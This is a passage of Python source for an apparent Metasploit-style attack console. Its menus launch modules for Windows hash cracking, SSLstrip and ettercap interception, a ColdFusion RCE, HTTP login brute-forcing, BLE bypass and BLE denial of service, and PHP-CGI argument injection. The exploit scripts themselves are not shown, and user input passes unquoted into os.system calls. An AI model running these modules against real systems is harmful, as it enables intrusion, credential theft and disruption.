        aauxiliarypasswordcrackingcrackwindowshash()
    elif scconsole97 == "exploit":
        windowshash2 = input("Enter Windows Hash: ")
        windowswordlist2 = input("Enter path of your wordlist: ")
        os.system(f'python exploits/auxiliary/password_cracking/crack-windows-hash.py {windowshash2} {windowswordlist2}')
        aauxiliarypasswordcrackingcrackwindowshash()
    elif scconsole97 == "unuse":
        print("unusing auxiliary/password_cracking/crack-windows-hash.")
        time.sleep(0.5)
        Console()
    elif scconsole97 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sssnifferSSLstrip():
    scconsole98 = input("sc~" + color.red + "(sniffer/SSLstrip)" + color.white + ">")
    if scconsole98 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssnifferSSLstrip()
    elif scconsole98 == "clear":
        os.system('clear')
        sssnifferSSLstrip()
    elif scconsole98 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
INTERFACE     | specify interface (eth0, etc).

you will specifiy these options when you run or exploit it!
""")
        sssnifferSSLstrip()
    elif scconsole98 == "run":
        os.system('sudo python exploits/sniffer/SSLstrip.py')
        sssnifferSSLstrip()
    elif scconsole98 == "exploit":
        os.system('sudo python exploits/sniffer/SSLstrip.py')
        sssnifferSSLstrip()
    elif scconsole98 == "unuse":
        print("unusing sniffer/SSLstrip.")
        time.sleep(0.5)
        Console()
    elif scconsole98 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sssniffertcpdumpsniffer():
    scconsole99 = input("sc~" + color.red + "(sniffer/tcpdump-sniffer)" + color.white + ">")
    if scconsole99 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssniffertcpdumpsniffer()
    elif scconsole99 == "clear":
        os.system('clear')
        sssniffertcpdumpsniffer()
    elif scconsole99 == "show options":
        print("""
OPTIONS        | DISCREPTIONS
---------------|----------------------
INTERFACE      | specify interface (eth0, etc).
FILE_NAME      | specify the file name to save.
CAPTURE_FILTER | specify the capture filter.

you will specifiy these options when you run or exploit it!
""")
        sssniffertcpdumpsniffer()
    elif scconsole99 == "run":
        os.system('sudo python exploits/sniffer/tcpdump-sniffer.py')
        sssniffertcpdumpsniffer()
    elif scconsole99 == "exploit":
        os.system('sudo python exploits/sniffer/tcpdump-sniffer.py')
        sssniffertcpdumpsniffer()
    elif scconsole99 == "unuse":
        print("unusing sniffer/tcpdump-sniffer.")
        time.sleep(0.5)
        Console()
    elif scconsole99 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sssnifferettercapsniffer():
    scconsole100 = input("sc~" + color.red + "(sniffer/ettercap-sniffer)" + color.white + ">")
    if scconsole100 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssnifferettercapsniffer()
    elif scconsole100 == "clear":
        os.system('clear')
        sssnifferettercapsniffer()
    elif scconsole100 == "show options":
        print("""
OPTIONS        | DISCREPTIONS
---------------|----------------------
RHOST          | specify target ip address.
GATEWAY        | specify the gateway ip address.
INTERFACE      | specify interface (eth0, etc).

you will specifiy these options when you run or exploit it!
""")
        sssnifferettercapsniffer()
    elif scconsole100 == "run":
        os.system('sudo python exploits/sniffer/ettercap-sniffer.py')
        sssnifferettercapsniffer()
    elif scconsole100 == "exploit":
        os.system('sudo python exploits/sniffer/ettercap-sniffer.py')
        sssnifferettercapsniffer()
    elif scconsole100 == "unuse":
        print("unusing sniffer/ettercap-sniffer.")
        time.sleep(0.5)
        Console()
    elif scconsole100 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def sssniffertsharksniffer():
    scconsole101 = input("sc~" + color.red + "(sniffer/tshark-sniffer)" + color.white + ">")
    if scconsole101 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssniffertsharksniffer()
    elif scconsole101 == "clear":
        os.system('clear')
        sssniffertsharksniffer()
    elif scconsole101 == "show options":
        print("""
OPTIONS        | DISCREPTIONS
---------------|----------------------
INTERFACE      | specify interface (eth0, etc).
FILE_NAME      | specify the file name to save.
CAPTURE_FILTER | specify the capture filter.

you will specifiy these options when you run or exploit it!
""")
        sssniffertsharksniffer()
    elif scconsole101 == "run":
        os.system('sudo python exploits/sniffer/tshark-sniffer.py')
        sssniffertsharksniffer()
    elif scconsole101 == "exploit":
        os.system('sudo python exploits/sniffer/tshark-sniffer.py')
        sssniffertsharksniffer()
    elif scconsole101 == "unuse":
        print("unusing sniffer/tshark-sniffer.")
        time.sleep(0.5)
        Console()
    elif scconsole101 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarypipeauditor():
    scconsole102 = input("sc~" + color.red + "(auxiliary/pipe_auditor)" + color.white + ">")
    if scconsole102 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypipeauditor()
    elif scconsole102 == "clear":
        os.system('clear')
        aauxiliarypipeauditor()
    elif scconsole102 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
SERVER_IP     | specify the server ip address.
SHARE         | specify the share name.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypipeauditor()
    elif scconsole102 == "run":
        os.system('python exploits/auxiliary/pipe_auditor.py')
        aauxiliarypipeauditor()
    elif scconsole102 == "exploit":
        os.system('python exploits/auxiliary/pipe_auditor.py')
        aauxiliarypipeauditor()
    elif scconsole102 == "unuse":
        print("unusing auxiliary/pipe_auditor.")
        time.sleep(0.5)
        Console()
    elif scconsole102 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarysmbenumshares():
    scconsole103 = input("sc~" + color.red + "(auxiliary/smb_enumshares)" + color.white + ">")
    if scconsole103 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarysmbenumshares()
    elif scconsole103 == "clear":
        os.system('clear')
        aauxiliarysmbenumshares()
    elif scconsole103 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
SERVER_IP     | specify the server ip address.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarysmbenumshares()
    elif scconsole103 == "run":
        os.system('python exploits/auxiliary/smb_enumshares.py')
        aauxiliarysmbenumshares()
    elif scconsole103 == "exploit":
        os.system('python exploits/auxiliary/smb_enumshares.py')
        aauxiliarysmbenumshares()
    elif scconsole103 == "unuse":
        print("unusing auxiliary/smb_enumshares.")
        time.sleep(0.5)
        Console()
    elif scconsole103 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarywebspider():
    scconsole104 = input("sc~" + color.red + "(auxiliary/web-spider)" + color.white + ">")
    if scconsole104 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarywebspider()
    elif scconsole104 == "clear":
        os.system('clear')
        aauxiliarywebspider()
    elif scconsole104 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarywebspider()
    elif scconsole104 == "run":
        os.system('python exploits/auxiliary/web-spider.py')
        aauxiliarywebspider()
    elif scconsole104 == "exploit":
        os.system('python exploits/auxiliary/web-spider.py')
        aauxiliarywebspider()
    elif scconsole104 == "unuse":
        print("unusing auxiliary/web-spider.")
        time.sleep(0.5)
        Console()
    elif scconsole104 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliaryapachemodstatus():
    scconsole105 = input("sc~" + color.red + "(auxiliary/apache_mod_status)" + color.white + ">")
    if scconsole105 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryapachemodstatus()
    elif scconsole105 == "clear":
        os.system('clear')
        aauxiliaryapachemodstatus()
    elif scconsole105 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryapachemodstatus()
    elif scconsole105 == "run":
        os.system('python exploits/auxiliary/apache_mod_status.py')
        aauxiliaryapachemodstatus()
    elif scconsole105 == "exploit":
        os.system('python exploits/auxiliary/apache_mod_status.py')
        aauxiliaryapachemodstatus()
    elif scconsole105 == "unuse":
        print("unusing auxiliary/apache_mod_status.")
        time.sleep(0.5)
        Console()
    elif scconsole105 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliarycoldfusionrce():
    scconsole106 = input("sc~" + color.red + "(auxiliary/coldfusion_rce)" + color.white + ">")
    if scconsole106 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarycoldfusionrce()
    elif scconsole106 == "clear":
        os.system('clear')
        aauxiliarycoldfusionrce()
    elif scconsole106 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url.
PAYLOAD       | specify the payload you want.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarycoldfusionrce()
    elif scconsole106 == "run":
        urltarget111 = input("Enter target URL: ")
        payloadtarget111 = input("Enter the PAYLOAD: ")
        os.system(f'python exploits/auxiliary/coldfusion_rce.py {urltarget111} {payloadtarget111}')
        aauxiliarycoldfusionrce()
    elif scconsole106 == "exploit":
        urltarget112 = input("Enter target URL: ")
        payloadtarget112 = input("Enter the PAYLOAD: ")
        os.system(f'python exploits/auxiliary/coldfusion_rce.py {urltarget112} {payloadtarget112}')
        aauxiliarycoldfusionrce()
    elif scconsole106 == "unuse":
        print("unusing auxiliary/coldfusion_rce.")
        time.sleep(0.5)
        Console()
    elif scconsole106 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def aauxiliaryhttpformbrute():
    scconsole107 = input("sc~" + color.red + "(auxiliary/http-form-brute)" + color.white + ">")
    if scconsole107 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryhttpformbrute()
    elif scconsole107 == "clear":
        os.system('clear')
        aauxiliaryhttpformbrute()
    elif scconsole107 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url.
USERNAMEFIELD | specify the username field.
PASSWORDFIELD | specify the password field.
USERNAMELIST  | specify the username list.
PASSWORDLIST  | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryhttpformbrute()
    elif scconsole107 == "run":
        urltarget113 = input("Enter target URL: ")
        usernamefield1 = input("USERNAMEFIELD: ")
        passwordfield1 = input("PASSWORDFIELD: ")
        usernamelist123 = input("USERNAMELIST: ")
        passwordlist123 = input("PASSWORDLIST: ")
        os.system(f'python exploits/auxiliary/http-form-brute.py {urltarget113} {usernamefield1} {passwordfield1} {usernamelist123} {passwordlist123}')
        aauxiliaryhttpformbrute()
    elif scconsole107 == "exploit":
        urltarget114 = input("Enter target URL: ")
        usernamefield2 = input("USERNAMEFIELD: ")
        passwordfield2 = input("PASSWORDFIELD: ")
        usernamelist122 = input("USERNAMELIST: ")
        passwordlist122 = input("PASSWORDLIST: ")
        os.system(f'python exploits/auxiliary/http-form-brute.py {urltarget114} {usernamefield2} {passwordfield2} {usernamelist122} {passwordlist122}')
        aauxiliaryhttpformbrute()
    elif scconsole107 == "unuse":
        print("unusing auxiliary/http-form-brute.")
        time.sleep(0.5)
        Console()
    elif scconsole107 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def multinmapversiondetection():
    scconsole108 = input("sc~" + color.red + "(multi/nmap-version-detection)" + color.white + ">")
    if scconsole108 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        multinmapversiondetection()
    elif scconsole108 == "clear":
        os.system('clear')
        multinmapversiondetection()
    elif scconsole108 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address.

you will specifiy these options when you run or exploit it!
""")
        multinmapversiondetection()
    elif scconsole108 == "run":
        os.system('python exploits/multi/nmap-version-detection.py')
        multinmapversiondetection()
    elif scconsole108 == "exploit":
        os.system('python exploits/multi/nmap-version-detection.py')
        multinmapversiondetection()
    elif scconsole108 == "unuse":
        print("unusing multi/nmap-version-detection.")
        time.sleep(0.5)
        Console()
    elif scconsole108 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def snifferblescanner():
    scconsole109 = input("sc~" + color.red + "(sniffer/ble-scanner)" + color.white + ">")
    if scconsole109 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        snifferblescanner()
    elif scconsole109 == "clear":
        os.system('clear')
        snifferblescanner()
    elif scconsole109 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        snifferblescanner()
    elif scconsole109 == "run":
        os.system('sudo python exploits/sniffer/ble-scanner.py')
        snifferblescanner()
    elif scconsole109 == "exploit":
        os.system('sudo python exploits/sniffer/ble-scanner.py')
        snifferblescanner()
    elif scconsole109 == "unuse":
        print("unusing sniffer/ble-scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole109 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def multiblebypass():
    scconsole110 = input("sc~" + color.red + "(multi/ble-bypass)" + color.white + ">")
    if scconsole110 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        multiblebypass()
    elif scconsole110 == "clear":
        os.system('clear')
        multiblebypass()
    elif scconsole110 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
BLE_ADDRESS   | specify target bluetooth address of target device.

you will specifiy these options when you run or exploit it!
""")
        multiblebypass()
    elif scconsole110 == "run":
        os.system('sudo python exploits/multi/ble-bypass.py')
        multiblebypass()
    elif scconsole110 == "exploit":
        os.system('sudo python exploits/multi/ble-bypass.py')
        multiblebypass()
    elif scconsole110 == "unuse":
        print("unusing multi/ble-bypass.")
        time.sleep(0.5)
        Console()
    elif scconsole110 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def multiblescanner():
    scconsole111 = input("sc~" + color.red + "(multi/ble-scanner)" + color.white + ">")
    if scconsole111 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        multiblescanner()
    elif scconsole111 == "clear":
        os.system('clear')
        multiblescanner()
    elif scconsole111 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        multiblescanner()
    elif scconsole111 == "run":
        os.system('sudo python exploits/multi/ble-scanner.py')
        multiblescanner()
    elif scconsole111 == "exploit":
        os.system('sudo python exploits/multi/ble-scanner.py')
        multiblescanner()
    elif scconsole111 == "unuse":
        print("unusing multi/ble-scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole111 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def dosbledos():
    scconsole112 = input("sc~" + color.red + "(dos/ble-dos)" + color.white + ">")
    if scconsole112 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        dosbledos()
    elif scconsole112 == "clear":
        os.system('clear')
        dosbledos()
    elif scconsole112 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
BLE_ADDRESS   | specify target bluetooth address of target device.

you will specifiy these options when you run or exploit it!
""")
        dosbledos()
    elif scconsole112 == "run":
        os.system('sudo python exploits/dos/ble-dos.py')
        dosbledos()
    elif scconsole112 == "exploit":
        os.system('sudo python exploits/dos/ble-dos.py')
        dosbledos()
    elif scconsole112 == "unuse":
        print("unusing dos/ble-dos.")
        time.sleep(0.5)
        Console()
    elif scconsole112 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def scannerportscantcp():
    scconsole113 = input("sc~" + color.red + "(scanner/portscan-tcp)" + color.white + ">")
    if scconsole113 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerportscantcp()
    elif scconsole113 == "clear":
        os.system('clear')
        scannerportscantcp()
    elif scconsole113 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address or website.
START_PORT    | specify the starting port.
END_PORT      | specify the ending port.

you will specifiy these options when you run or exploit it!
""")
        scannerportscantcp()
    elif scconsole113 == "run":
        os.system('python exploits/scanner/portscan-tcp.py')
        scannerportscantcp()
    elif scconsole113 == "exploit":
        os.system('python exploits/scanner/portscan-tcp.py')
        scannerportscantcp()
    elif scconsole113 == "unuse":
        print("unusing scanner/portscan-tcp.")
        time.sleep(0.5)
        Console()
    elif scconsole113 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def scannerblescanner():
    scconsole114 = input("sc~" + color.red + "(scanner/ble-scanner)" + color.white + ">")
    if scconsole114 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerblescanner()
    elif scconsole114 == "clear":
        os.system('clear')
        scannerblescanner()
    elif scconsole114 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        scannerblescanner()
    elif scconsole114 == "run":
        os.system('sudo python exploits/scanner/ble-scanner.py')
        scannerblescanner()
    elif scconsole114 == "exploit":
        os.system('sudo python exploits/scanner/ble-scanner.py')
        scannerblescanner()
    elif scconsole114 == "unuse":
        print("unusing scanner/ble-scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole114 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def scannervncnoneauth():
    scconsole115 = input("sc~" + color.red + "(scanner/vnc-none-auth)" + color.white + ">")
    if scconsole115 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannervncnoneauth()
    elif scconsole115 == "clear":
        os.system('clear')
        scannervncnoneauth()
    elif scconsole115 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address.
RPORT         | specifed as 5900 (VNC port).

you will specifiy these options when you run or exploit it!
""")
        scannervncnoneauth()
    elif scconsole115 == "run":
        os.system('python exploits/scanner/vnc-none-auth.py')
        scannervncnoneauth()
    elif scconsole115 == "exploit":
        os.system('python exploits/scanner/vnc-none-auth.py')
        scannervncnoneauth()
    elif scconsole115 == "unuse":
        print("unusing scanner/vnc-none-auth.")
        time.sleep(0.5)
        Console()
    elif scconsole115 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def scannerftpanon():
    scconsole116 = input("sc~" + color.red + "(scanner/ftp-anon)" + color.white + ">")
    if scconsole116 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerftpanon()
    elif scconsole116 == "clear":
        os.system('clear')
        scannerftpanon()
    elif scconsole116 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address.
RPORT         | specifed as 21 (ftp port).

you will specifiy these options when you run or exploit it!
""")
        scannerftpanon()
    elif scconsole116 == "run":
        os.system('python exploits/scanner/ftp-anon.py')
        scannerftpanon()
    elif scconsole116 == "exploit":
        os.system('python exploits/scanner/ftp-anon.py')
        scannerftpanon()
    elif scconsole116 == "unuse":
        print("unusing scanner/ftp-anon.")
        time.sleep(0.5)
        Console()
    elif scconsole116 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def scannerportmapamp():
    scconsole117 = input("sc~" + color.red + "(scanner/portmap-amp)" + color.white + ">")
    if scconsole117 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerportmapamp()
    elif scconsole117 == "clear":
        os.system('clear')
        scannerportmapamp()
    elif scconsole117 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address.
RPORT         | specifed as 80 (HTTP port).

you will specifiy these options when you run or exploit it!
""")
        scannerportmapamp()
    elif scconsole117 == "run":
        os.system('python exploits/scanner/portmap-amp.py')
        scannerportmapamp()
    elif scconsole117 == "exploit":
        os.system('python exploits/scanner/portmap-amp.py')
        scannerportmapamp()
    elif scconsole117 == "unuse":
        print("unusing scanner/portmap-amp.")
        time.sleep(0.5)
        Console()
    elif scconsole117 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def scannersubdomainscan():
    scconsole118 = input("sc~" + color.red + "(scanner/subdomain-scan)" + color.white + ">")
    if scconsole118 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannersubdomainscan()
    elif scconsole118 == "clear":
        os.system('clear')
        scannersubdomainscan()
    elif scconsole118 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
WEBSITE       | specify target website.
WORDLIST      | specify the wordlist to use for scan.

you will specifiy these options when you run or exploit it!
""")
        scannersubdomainscan()
    elif scconsole118 == "run":
        os.system('python exploits/scanner/subdomain-scan.py')
        scannersubdomainscan()
    elif scconsole118 == "exploit":
        os.system('python exploits/scanner/subdomain-scan.py')
        scannersubdomainscan()
    elif scconsole118 == "unuse":
        print("unusing scanner/subdomain-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole118 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def scannerportscan():
    scconsole119 = input("sc~" + color.red + "(scanner/portscan)" + color.white + ">")
    if scconsole119 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerportscan()
    elif scconsole119 == "clear":
        os.system('clear')
        scannerportscan()
    elif scconsole119 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address or website.
RPORTS        | specify ports to start scan them.

you will specifiy these options when you run or exploit it!
""")
        scannerportscan()
    elif scconsole119 == "run":
        os.system('python exploits/scanner/portscan.py')
        scannerportscan()
    elif scconsole119 == "exploit":
        os.system('python exploits/scanner/portscan.py')
        scannerportscan()
    elif scconsole119 == "unuse":
        print("unusing scanner/portscan.")
        time.sleep(0.5)
        Console()
    elif scconsole119 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def auxiliarysqlixssvuln():
    scconsole120 = input("sc~" + color.red + "(auxiliary/sqli-xss-vuln)" + color.white + ">")
    if scconsole120 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarysqlixssvuln()
    elif scconsole120 == "clear":
        os.system('clear')
        auxiliarysqlixssvuln()
    elif scconsole120 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify target url.

you will specifiy these options when you run or exploit it!
""")
        auxiliarysqlixssvuln()
    elif scconsole120 == "run":
        os.system('python exploits/auxiliary/sqli-xss-vuln.py')
        auxiliarysqlixssvuln()
    elif scconsole120 == "exploit":
        os.system('python exploits/auxiliary/sqli-xss-vuln.py')
        auxiliarysqlixssvuln()
    elif scconsole120 == "unuse":
        print("unusing auxiliary/sqli-xss-vuln.")
        time.sleep(0.5)
        Console()
    elif scconsole120 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def scannerpingipsite():
    scconsole121 = input("sc~" + color.red + "(scanner/ping_ip_site)" + color.white + ">")
    if scconsole121 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerpingipsite()
    elif scconsole121 == "clear":
        os.system('clear')
        scannerpingipsite()
    elif scconsole121 == "show options":
        print("""
1.
OPTIONS       | DISCREPTIONS
--------------|----------------------
WEBSITE       | specify target url.

2.
OPTIONS       | DISCREPTIONS
--------------|----------------------
IP_ADDRESS    | specify target url.

you will specifiy these options when you run or exploit it!
this exploit can scan wensite and ip address!
""")
        scannerpingipsite()
    elif scconsole121 == "run":
        os.system('python exploits/scanner/ping_ip_site.py')
        scannerpingipsite()
    elif scconsole121 == "exploit":
        os.system('python exploits/scanner/ping_ip_site.py')
        scannerpingipsite()
    elif scconsole121 == "unuse":
        print("unusing scanner/ping_ip_site.")
        time.sleep(0.5)
        Console()
    elif scconsole121 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def auxiliarycheckloginvuln():
    scconsole122 = input("sc~" + color.red + "(auxiliary/check-login-vuln)" + color.white + ">")
    if scconsole122 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarycheckloginvuln()
    elif scconsole122 == "clear":
        os.system('clear')
        auxiliarycheckloginvuln()
    elif scconsole122 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify target url.

you will specifiy these options when you run or exploit it!
""")
        auxiliarycheckloginvuln()
    elif scconsole122 == "run":
        os.system('python exploits/auxiliary/check-login-vuln.py')
        auxiliarycheckloginvuln()
    elif scconsole122 == "exploit":
        os.system('python exploits/auxiliary/check-login-vuln.py')
        auxiliarycheckloginvuln()
    elif scconsole122 == "unuse":
        print("unusing auxiliary/check-login-vuln.")
        time.sleep(0.5)
        Console()
    elif scconsole122 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def serverphpcgiarginjection():
    scconsole123 = input("sc~" + color.red + "(server/php-cgi-arg-injection)" + color.white + ">")
    if scconsole123 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> shows the payloads you can use in this exploit.
""")
        serverphpcgiarginjection()
    elif scconsole123 == "clear":
        os.system('clear')
        serverphpcgiarginjection()
    elif scconsole123 == "show options":
        print("""
